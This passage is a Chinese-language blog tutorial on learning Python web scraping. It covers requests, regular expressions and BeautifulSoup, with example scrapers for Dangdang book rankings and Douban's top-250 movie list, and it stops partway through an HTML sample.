      <url>2021/11/10/python%20spider%20learning/</url>
      
        <content type="html"><![CDATA[<h1 id="python-spider-learning"><a href="#python-spider-learning" class="headerlink" title="python spider learning"></a>python spider learning</h1><p>本文章记录python爬虫的学习内容，相当于学习python的知识点。</p><p>差不多就学到能爬图片，能爬视频，爬歌吧，简单入个门，也就是感兴趣然后来学了点，还是不错，比二进制收益来的快多了，哈哈哈。后面还是补一下hook，和反调试的文章吧，整理太花时间了，但还是必须整理。。。</p><h2 id="request库用法"><a href="#request库用法" class="headerlink" title="request库用法"></a>request库用法</h2><p>一行代码 Get 请求</p><pre><code>r = requests.get(&#39;https://api.github.com/events&#39;)</code></pre><p>一行代码 Post 请求</p><pre><code>r = requests.post(&#39;https://httpbin.org/post&#39;, data = &#123;&#39;key&#39;:&#39;value&#39;&#125;)</code></pre><p>获取服务器响应文本内容</p><pre><code>import requestsr = requests.get(&#39;https://api.github.com/events&#39;)r.text</code></pre><p>假装自己是浏览器</p><pre><code>url = &#39;https://api.github.com/some/endpoint&#39;headers = &#123;&#39;user-agent&#39;: &#39;my-app/0.0.1&#39;&#125;r = requests.get(url, headers=headers)</code></pre><p>获取服务器响应文本内容</p><pre><code>import requestsr = requests.get(&#39;https://api.github.com/events&#39;)r.text</code></pre><p>获取响应码</p><pre><code>r = requests.get(&#39;https://httpbin.org/get&#39;)r.status_code</code></pre><h2 id="re库-正则表达式"><a href="#re库-正则表达式" class="headerlink" title="re库 正则表达式"></a>re库 正则表达式</h2><p>用来提取很多字符串中，我们需要的信息。</p><p>re.S，用来针对换行这种。</p><p>贪婪匹配与非贪婪匹配，就是.<em>和.</em>?</p><pre><code>import res=&quot;s_#aa&amp;&quot;res = re.findall(&#39;.*&#39;,s,re.S)print(res)res = re.findall(&#39;.*?&#39;,s,re.S)print(res)# [&#39;s_#aa&amp;&#39;, &#39;&#39;]# [&#39;&#39;, &#39;s&#39;, &#39;&#39;, &#39;_&#39;, &#39;&#39;, &#39;#&#39;, &#39;&#39;, &#39;a&#39;, &#39;&#39;, &#39;a&#39;, &#39;&#39;, &#39;&amp;&#39;, &#39;&#39;]</code></pre><p>*?是一个数一个数都要匹配，.*？则是匹配</p><p>.*？这个用的比较多匹配任意字符串，我只能说6逼，这个几乎你给个头给给尾，直接就能帮你匹配到想要的字符串。</p><p>下面来个例子，也是后面有个例子会用到，直接就明白了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;&#x27; &lt;li&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;list_num &quot;&gt;21.&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;pic&quot;&gt;&lt;a href=&quot;http://product.dangdang.com/28541936.html&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://img3m6.ddimg.cn/38/25/28541936-1_l_9.jpg&quot; alt=&quot;男孩的学习力&quot;  title=&quot;男孩的学习力&quot;/&gt;&lt;/a&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;name&quot;&gt;&lt;a href=&quot;http://product.dangdang.com/28541936.html&quot; target=&quot;_blank&quot; title=&quot;男孩的学习力&quot;&gt;男孩的学习力&lt;/a&gt;&lt;/div&gt; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">res = re.findall(<span class="string">&#x27;&lt;li&gt;.*?&gt;(\d+).*?&#x27;</span>,s,re.S)</span><br><span class="line">print(res)</span><br><span class="line">res = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot;&#x27;</span>,s,re.S)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">res = re.findall(<span class="string">&#x27;title=&quot;(.*?)&quot;.*?class=&quot;name&quot;&#x27;</span>,s,re.S)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#[&#x27;21&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;http://img3m6.ddimg.cn/38/25/28541936-1_l_9.jpg&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;男孩的学习力&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="第一个爬虫"><a href="#第一个爬虫" class="headerlink" title="第一个爬虫"></a>第一个爬虫</h2><p>爬取当当网的书籍数据。</p><p>主要分3块</p><ul><li>request用get请求网站，接收到服务器的返回数据</li><li>正则表达式处理数据，获得我们想要的。</li><li>将有效数据整理，然后存入文件。</li></ul><p>get请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>正则表达式搜索</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;&#x27; &lt;li&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;list_num &quot;&gt;22.&lt;/div&gt;   </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;pic&quot;&gt;&lt;a href=&quot;http://product.dangdang.com/28541936.html&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://img3m6.ddimg.cn/38/25/28541936-1_l_9.jpg&quot; alt=&quot;男孩的学习力&quot;  title=&quot;男孩的学习力&quot;/&gt;&lt;/a&gt;&lt;/div&gt;    </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;name&quot;&gt;&lt;a href=&quot;http://product.dangdang.com/28541936.html&quot; target=&quot;_blank&quot; title=&quot;男孩的学习力&quot;&gt;男孩的学习力&lt;/a&gt;&lt;/div&gt;    </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;star&quot;&gt;&lt;span class=&quot;level&quot;&gt;&lt;span style=&quot;width: 97.2%;&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;a href=&quot;http://product.dangdang.com/28541936.html?point=comment_point&quot; target=&quot;_blank&quot;&gt;123849条评论&lt;/a&gt;&lt;span class=&quot;tuijian&quot;&gt;100%推荐&lt;/span&gt;&lt;/div&gt;    </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;publisher_info&quot;&gt;[日]&lt;a href=&quot;http://search.dangdang.com/?key=富永雄辅&quot; title=&quot;[日]富永雄辅 著，吴一红 译，酷威文化 出品&quot; target=&quot;_blank&quot;&gt;富永雄辅&lt;/a&gt; 著，&lt;a href=&quot;http://search.dangdang.com/?key=吴一红&quot; title=&quot;[日]富永雄辅 著，吴一红 译，酷威文化 出品&quot; target=&quot;_blank&quot;&gt;吴一红&lt;/a&gt; 译，&lt;a href=&quot;http://search.dangdang.com/?key=酷威文化&quot; title=&quot;[日]富永雄辅 著，吴一红 译，酷威文化 出品&quot; target=&quot;_blank&quot;&gt;酷威文化&lt;/a&gt; 出品&lt;/div&gt;    </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;publisher_info&quot;&gt;&lt;span&gt;2020-06-01&lt;/span&gt;&amp;nbsp;&lt;a href=&quot;http://search.dangdang.com/?key=四川文艺出版社&quot; target=&quot;_blank&quot;&gt;四川文艺出版社&lt;/a&gt;&lt;/div&gt;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;div class=&quot;biaosheng&quot;&gt;五星评分：&lt;span&gt;91796次&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                      </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;price&quot;&gt;        </span></span><br><span class="line"><span class="string">        &lt;p&gt;&lt;span class=&quot;price_n&quot;&gt;&amp;yen;17.90&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;span class=&quot;price_r&quot;&gt;&amp;yen;39.80&lt;/span&gt;(&lt;span class=&quot;price_s&quot;&gt;4.5折&lt;/span&gt;)</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;p class=&quot;price_e&quot;&gt;电子书：&lt;span class=&quot;price_n&quot;&gt;&amp;yen;7.99&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;buy_button&quot;&gt;</span></span><br><span class="line"><span class="string">                          &lt;a ddname=&quot;加入购物车&quot; name=&quot;&quot; href=&quot;javascript:AddToShoppingCart(&#x27;28541936&#x27;);&quot; class=&quot;listbtn_buy&quot;&gt;加入购物车&lt;/a&gt;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        &lt;a name=&quot;&quot; href=&quot;http://product.dangdang.com/1901212680.html&quot; class=&quot;listbtn_buydz&quot; target=&quot;_blank&quot;&gt;购买电子书&lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;a ddname=&quot;加入收藏&quot; id=&quot;addto_favorlist_28541936&quot; name=&quot;&quot; href=&quot;javascript:showMsgBox(&#x27;addto_favorlist_28541936&#x27;,encodeURIComponent(&#x27;28541936&amp;platform=3&#x27;), &#x27;http://myhome.dangdang.com/addFavoritepop&#x27;);&quot; class=&quot;listbtn_collect&quot;&gt;收藏&lt;/a&gt;</span></span><br><span class="line"><span class="string">     </span></span><br><span class="line"><span class="string">        &lt;/div&gt; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">cmp=re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;li&gt;.*?&gt;(\d+).*?&lt;/div&gt;.*?&lt;img src=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*?class=&quot;name&quot;.*?class=&quot;tuijian&quot;&gt;(.*?)&lt;/span&gt;.*?target=&quot;_blank&quot;&gt;(.*?)&lt;/a&gt;.*?&lt;div class=&quot;biaosheng&quot;&gt;(.*?)&lt;span&gt;.*?&quot;price_n&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>,re.S)</span><br><span class="line">res = re.findall(cmp,s)</span><br><span class="line">print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存入文件</p><pre><code>def write_to_file(t):    with open(&#39;book.txt&#39;, &#39;a&#39;, encoding=&#39;UTF-8&#39;) as f:        f.write(json.dumps(t, ensure_ascii=False) + &#39;\n&#39;)</code></pre><p>可以看到json.dumps()</p><pre><code>json.dumps将一个Python数据结构转换为JSONimport jsondata = &#123;    &#39;name&#39; : &#39;myname&#39;,    &#39;age&#39; : 100,&#125;json_str = json.dumps(data)</code></pre><p>ensure_ascii=True：默认输出ASCLL码，如果把这个该成False,就可以输出中文。</p><p>完整代码，还是没太搞懂yield那个，为什么返回了全部的，而不是一组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#检测响应是否正确，一般是200，正确就会返回服务器传回来的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提起有用信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_useful</span>(<span class="params">html</span>):</span></span><br><span class="line">    cmp = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">&#x27;&lt;li&gt;.*?&gt;(\d+).*?&lt;/div&gt;.*?&lt;img src=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*?class=&quot;name&quot;.*?class=&quot;tuijian&quot;&gt;(.*?)&lt;/span&gt;.*?target=&quot;_blank&quot;&gt;(.*?)&lt;/a&gt;.*?&lt;div class=&quot;biaosheng&quot;&gt;(.*?)&lt;span&gt;.*?&quot;price_n&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>,</span><br><span class="line">        re.S)</span><br><span class="line">    texts = re.findall(cmp, html)</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据结构</span></span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">        <span class="keyword">yield</span> &#123;</span><br><span class="line">            <span class="string">&#x27;range&#x27;</span>: text[<span class="number">0</span>],</span><br><span class="line">            <span class="string">&#x27;image&#x27;</span>: text[<span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>: text[<span class="number">2</span>],</span><br><span class="line">            <span class="string">&#x27;recommend&#x27;</span>: text[<span class="number">3</span>],</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span>: text[<span class="number">4</span>],</span><br><span class="line">            <span class="string">&#x27;times&#x27;</span>: text[<span class="number">5</span>],</span><br><span class="line">            <span class="string">&#x27;price&#x27;</span>: text[<span class="number">6</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_file</span>(<span class="params">t</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;book.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(t, ensure_ascii=<span class="literal">False</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">i</span>):</span></span><br><span class="line">    url=<span class="string">&quot;http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    texts=request_juger(url)</span><br><span class="line">    text=find_useful(texts)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        write_to_file(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        main(i)</span><br></pre></td></tr></table></figure><h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><p>python的一个库，可以用来达到re库的一些效果，得到某一字符串，标题，超链接等等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html_doc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;学习python的正确姿势&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;小帅b的故事&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;有一天，小帅b想给大家讲两个笑话</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/1&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;一个笑话长&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/2&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;一个笑话短&lt;/a&gt; ,</span></span><br><span class="line"><span class="string">他问大家，想听长的还是短的？&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html_doc,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取标题的内容</span></span><br><span class="line">print(soup.title.string)</span><br><span class="line"><span class="comment">##学习python的正确姿势</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取 p 标签里面的内容</span></span><br><span class="line">print(soup.p.string)</span><br><span class="line"><span class="comment">#小帅b的故事</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取 title 的父级标签</span></span><br><span class="line">print(soup.title.parent.name)</span><br><span class="line"><span class="comment">#head</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取超链接</span></span><br><span class="line">print(soup.a)</span><br><span class="line"><span class="comment">#&lt;a class=&quot;sister&quot; href=&quot;http://example.com/1&quot; id=&quot;link1&quot;&gt;一个笑话长&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有超链接</span></span><br><span class="line">print(soup.find_all(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="comment">#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/1&quot; id=&quot;link1&quot;&gt;一个笑话长&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/2&quot; id=&quot;link2&quot;&gt;一个笑话短&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取 id 为 link2 的超链接</span></span><br><span class="line">print(soup.find(<span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>))</span><br><span class="line"><span class="comment">#&lt;a class=&quot;sister&quot; href=&quot;http://example.com/2&quot; id=&quot;link2&quot;&gt;一个笑话短&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取网页中所有的内容</span></span><br><span class="line">print(soup.get_text())</span><br><span class="line"><span class="comment"># 学习python的正确姿势</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 小帅b的故事</span></span><br><span class="line"><span class="comment"># 有一天，小帅b想给大家讲两个笑话</span></span><br><span class="line"><span class="comment"># 一个笑话长,</span></span><br><span class="line"><span class="comment"># 一个笑话短 ,</span></span><br><span class="line"><span class="comment"># 他问大家，想听长的还是短的？</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第二个爬虫"><a href="#第二个爬虫" class="headerlink" title="第二个爬虫"></a>第二个爬虫</h2><p>爬取豆瓣电影前250的电影信息，写入excel。不同于上个爬虫的就是使用的BeautifulSoup库，</p><p>爬取目标: url=<a href="https://movie.douban.com/top250?start=0&amp;filter=%EF%BC%8C%E6%94%B9%E5%8F%98%E7%9A%84%E5%8F%AA%E6%9C%89strat=25*%E9%A1%B5%E6%95%B0%E3%80%82">https://movie.douban.com/top250?start=0&amp;filter=，改变的只有strat=25*页数。</a></p><p>html基本信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">&quot;grid_view&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pic&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">em</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://movie.douban.com/subject/1292052/&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;肖申克的救赎&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://img2.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hd&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://movie.douban.com/subject/1292052/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>肖申克的救赎<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>The Shawshank Redemption<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;other&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>月黑高飞(港)  /  刺激1995(台)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;playable&quot;</span>&gt;</span>[可播放]<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bd&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                            导演: 弗兰克·德拉邦特 Frank Darabont<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>主演: 蒂姆·罗宾斯 Tim Robbins /...<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                            1994<span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>美国<span class="symbol">&amp;nbsp;</span>/<span class="symbol">&amp;nbsp;</span>犯罪 剧情</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;star&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rating5-t&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rating_num&quot;</span> <span class="attr">property</span>=<span class="string">&quot;v:average&quot;</span>&gt;</span>9.7<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">property</span>=<span class="string">&quot;v:best&quot;</span> <span class="attr">content</span>=<span class="string">&quot;10.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>2477393人评价<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;quote&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;inq&quot;</span>&gt;</span>希望让人自由。<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span 